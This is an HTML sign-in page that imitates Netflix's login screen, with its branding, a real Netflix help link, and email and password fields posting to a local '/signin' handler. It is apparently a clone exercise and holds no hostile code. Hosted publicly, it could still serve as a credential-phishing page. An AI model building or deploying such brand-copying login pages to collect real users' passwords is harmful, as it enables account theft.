<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <link rel="stylesheet" href="sistyle.css">
    <link rel="icon" type="image/x-icon" href="/img/favicon.ico">
</head>
<body>
    <div class="nav">
        <span>
            <img width="53" src="img/logo.svg" alt="logo" class="logo">
        </span>
        </div>
    <div class="main">
        <img src="/img/bg.jpg" alt="bg">
    </div>
    <div class="signin-container">
        <h1>Sign In</h1>
        <form action="/signin" method="POST">
          <div class="form-group">
            <input type="email" name="email" id="email" placeholder="Email or phone number" required>
          </div>
          <div class="form-group">
            <input type="password" name="password" id="password" placeholder="Password" required>
          </div>
          <button type="submit" class="signin-button">Sign In</button>
          <div class="helper-text">
            <div>
              <input type="checkbox" id="remember-me">
              <label for="remember-me" style="color:#989696;">Remember me</label>
            </div>
            <a href="https://www.netflix.com/in/LoginHelp">Forgot Password</a>
          </div>
        </form>
        <div class="signup-link">
          <p>New to Netflix? <a href="#">Sign up now</a>.</p>
        </div>
        <p class="disclaimer">This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more.</a></p>
      </div>
    
</body>
</html>
